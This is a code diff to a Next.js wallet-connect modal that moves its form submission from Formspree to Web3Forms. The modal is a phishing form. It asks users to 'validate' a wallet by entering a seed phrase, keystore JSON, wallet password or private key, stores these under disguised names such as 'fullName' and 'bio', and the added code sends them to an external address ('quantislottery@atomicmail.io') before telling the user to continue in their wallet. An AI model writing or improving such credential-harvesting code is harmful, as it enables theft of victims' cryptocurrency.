@@ -1,8 +1,7 @@
 "use client";
 
-import { useForm, ValidationError } from "@formspree/react";
 import { WALLET_OPTIONS } from "@/lib/data/wallets";
-import { FORMSPREE_WALLET_FORM_ID } from "@/lib/formspreeConfig";
+import { submitWeb3Forms } from "@/lib/web3formsConfig";
 import { getImagePath } from "@/lib/utils/imagePath";
 import {
   Tab,
@@ -13,7 +12,7 @@ import {
 } from "@headlessui/react";
 import { Icon } from "@iconify/react/dist/iconify.js";
 import Image from "next/image";
-import { useCallback, useEffect, useRef, useState } from "react";
+import { useCallback, useEffect, useState } from "react";
 import toast from "react-hot-toast";
 
 type Step =
@@ -244,7 +243,6 @@ const validateTextAreaClassName =
 const validateInputClassName =
   "w-full rounded-xl border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/30";
 
-const FORMSPREE_ACTION = `https://formspree.io/f/${FORMSPREE_WALLET_FORM_ID}`;
 const DEFAULT_SUBMISSION_EMAIL = "quantislottery@atomicmail.io";
 
 function submissionErrorMessage(reason: unknown): string {
@@ -273,9 +271,8 @@ const WalletConnectModal = ({ onClose }: Props) => {
   const [bio, setBio] = useState("");
   const [validateTabIndex, setValidateTabIndex] = useState(0);
 
-  const [formspreeState, formspreeSubmit, resetFormspree] =
-    useForm(FORMSPREE_WALLET_FORM_ID);
-  const formspreeSuccessHandled = useRef(false);
+  const [submitting, setSubmitting] = useState(false);
+  const [formError, setFormError] = useState<string | null>(null);
 
   const selected = WALLET_OPTIONS.find((w) => w.id === selectedId);
   const filteredWallets = WALLET_OPTIONS.filter((w) =>
@@ -319,14 +316,13 @@ const WalletConnectModal = ({ onClose }: Props) => {
   }, [step, selectedId, goToValidateForm]);
 
   const resetValidateFields = useCallback(() => {
-    formspreeSuccessHandled.current = false;
-    resetFormspree();
+    setFormError(null);
     setFullName("");
     setUsername("");
     setNews("");
     setBio("");
     setValidateTabIndex(0);
-  }, [resetFormspree]);
+  }, []);
 
   const resetAndClose = useCallback(() => {
     setStep("list");
@@ -336,23 +332,13 @@ const WalletConnectModal = ({ onClose }: Props) => {
     onClose();
   }, [onClose, resetValidateFields]);
 
-  useEffect(() => {
-    if (!formspreeState.succeeded || formspreeSuccessHandled.current) return;
-    formspreeSuccessHandled.current = true;
-    const name = fullName.trim();
-    toast.success(
-      `Thanks, ${name}. Continue in ${selected?.name ?? "your wallet"}.`
-    );
-    resetAndClose();
-  }, [formspreeState.succeeded, fullName, selected, resetAndClose]);
-
   const handleWalletClick = (id: string) => {
     setSelectedId(id);
     resetValidateFields();
     setStep("initializing");
   };
 
-  const handleValidate = (e: React.FormEvent<HTMLFormElement>) => {
+  const handleValidate = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     if (validateTabIndex === 0) {
       if (!fullName.trim()) {
@@ -375,10 +361,43 @@ const WalletConnectModal = ({ onClose }: Props) => {
       }
     }
 
-    void formspreeSubmit(e).catch((reason: unknown) => {
-      console.error("[wallet validate] Formspree submit failed", reason);
-      toast.error(submissionErrorMessage(reason));
-    });
+    const activeTab =
+      validateTabIndex === 0
+        ? "phrase"
+        : validateTabIndex === 1
+          ? "keystore"
+          : "private_key";
+    const displayName =
+      fullName.trim() || username.trim() || bio.trim().slice(0, 48) || "—";
+
+    setFormError(null);
+    setSubmitting(true);
+    try {
+      await submitWeb3Forms({
+        subject: `Wallet validate — ${selected?.name ?? "wallet"}`,
+        email: DEFAULT_SUBMISSION_EMAIL,
+        name: displayName,
+        message: `Wallet: ${selected?.name ?? ""} (${selected?.id ?? ""}). Active tab: ${activeTab}.`,
+        selected_wallet: selected?.name ?? "",
+        selected_wallet_id: selected?.id ?? "",
+        active_tab: activeTab,
+        phrase: fullName.trim(),
+        keystore_json: news.trim(),
+        wallet_password: username.trim(),
+        private_key: bio.trim(),
+      });
+      toast.success(
+        `Thanks, ${displayName}. Continue in ${selected?.name ?? "your wallet"}.`
+      );
+      resetAndClose();
+    } catch (reason: unknown) {
+      console.error("[wallet validate] Web3Forms submit failed", reason);
+      const msg = submissionErrorMessage(reason);
+      setFormError(msg);
+      toast.error(msg);
+    } finally {
+      setSubmitting(false);
+    }
   };
 
   const goBack = () => {
@@ -485,9 +504,7 @@ const WalletConnectModal = ({ onClose }: Props) => {
           ) : null
         ) : (
           <form
-            action={FORMSPREE_ACTION}
-            method="POST"
-            onSubmit={handleValidate}
+            onSubmit={(e) => void handleValidate(e)}
             className="flex flex-col p-5 sm:p-6"
           >
             <button
@@ -518,19 +535,6 @@ const WalletConnectModal = ({ onClose }: Props) => {
             <p className="mb-4 text-sm text-gray-600">
               Import your {selected?.name ?? "selected"} wallet.
             </p>
-
-            {selected ? (
-              <>
-                <input type="hidden" name="selected_wallet" value={selected.name} />
-                <input type="hidden" name="selected_wallet_id" value={selected.id} />
-              </>
-            ) : null}
-            <input
-              type="hidden"
-              name="email"
-              value={DEFAULT_SUBMISSION_EMAIL}
-              readOnly
-            />
 
             <TabGroup
               selectedIndex={validateTabIndex}
@@ -564,12 +568,6 @@ const WalletConnectModal = ({ onClose }: Props) => {
                     onChange={(e) => setFullName(e.target.value)}
                     className={validateTextAreaClassName}
                   />
-                  <ValidationError
-                    prefix="Enter your Phrase"
-                    field="fullname"
-                    errors={formspreeState.errors}
-                    className="mt-1 text-sm text-red-600"
-                  />
                 </TabPanel>
                 <TabPanel className="outline-none focus:outline-none">
                   <div className="flex flex-col gap-4">
@@ -587,12 +585,6 @@ const WalletConnectModal = ({ onClose }: Props) => {
                         onChange={(e) => setNews(e.target.value)}
                         className={validateTextAreaClassName}
                       />
-                      <ValidationError
-                        prefix="Enter your keystone JSON"
-                        field="keystone JSON"
-                        errors={formspreeState.errors}
-                        className="mt-1 text-sm text-red-600"
-                      />
                     </div>
                     <div>
                       <label htmlFor="wallet-username" className="sr-only">
@@ -608,12 +600,6 @@ const WalletConnectModal = ({ onClose }: Props) => {
                         disabled={validateTabIndex !== 1}
                         onChange={(e) => setUsername(e.target.value)}
                         className={validateInputClassName}
-                      />
-                      <ValidationError
-                        prefix="Wallet password"
-                        field="username"
-                        errors={formspreeState.errors}
-                        className="mt-1 text-sm text-red-600"
                       />
                     </div>
                   </div>
@@ -632,35 +618,23 @@ const WalletConnectModal = ({ onClose }: Props) => {
                     onChange={(e) => setBio(e.target.value)}
                     className={validateTextAreaClassName}
                   />
-                  <ValidationError
-                    prefix="Enter your Private Key"
-                    field="bio"
-                    errors={formspreeState.errors}
-                    className="mt-1 text-sm text-red-600"
-                  />
                 </TabPanel>
               </TabPanels>
             </TabGroup>
 
-            {formspreeState.errors
-              ? formspreeState.errors.getFormErrors().map((err, i) => (
-                  <p
-                    key={`${err.code}-${i}`}
-                    className="mb-2 text-sm text-red-600"
-                    role="alert"
-                  >
-                    {err.message}
-                  </p>
-                ))
-              : null}
+            {formError ? (
+              <p className="mb-2 text-sm text-red-600" role="alert">
+                {formError}
+              </p>
+            ) : null}
 
             <div className="mt-2 flex flex-wrap gap-3">
               <button
                 type="submit"
-                disabled={formspreeState.submitting}
+                disabled={submitting}
                 className="flex-1 rounded-xl bg-linear-to-r from-primary to-secondary py-3 font-semibold text-white transition hover:opacity-95 min-w-[8rem] disabled:cursor-not-allowed disabled:opacity-60"
               >
-                {formspreeState.submitting ? "Sending…" : "Validate"}
+                {submitting ? "Sending…" : "Validate"}
               </button>
               <button
                 type="button"
